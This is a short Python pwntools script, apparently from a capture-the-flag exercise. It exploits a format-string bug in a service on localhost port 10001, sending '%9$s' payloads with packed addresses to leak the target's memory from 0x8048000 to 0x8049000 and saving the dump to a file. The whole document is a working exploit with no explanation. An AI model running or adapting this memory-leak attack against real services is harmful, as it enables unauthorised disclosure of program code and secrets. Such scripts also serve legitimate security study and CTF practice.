#!/usr/bin/env python

from pwn import *

io = remote('127.0.0.1', '10001')

def dump_memory(start_addr, end_addr):
    result = ""
    while start_addr < end_addr:
        p = remote('127.0.0.1', '10001')
        p.recvline()
        #print result.encode('hex')
        payload = "%9$s.AAA" + p32(start_addr)
        p.sendline(payload)
        data = p.recvuntil(".AAA")[:-4]
        if data == "":
            data = "\x00"
        log.info("leaking: 0x%x --> %s" % (start_addr, data.encode('hex')))
        result += data
        start_addr += len(data)
        p.close()
    return result

start_addr = 0x8048000
end_addr   = 0x8049000
code_bin = dump_memory(start_addr, end_addr)

with open("code.bin", "wb") as f:
    f.write(code_bin)
    f.close()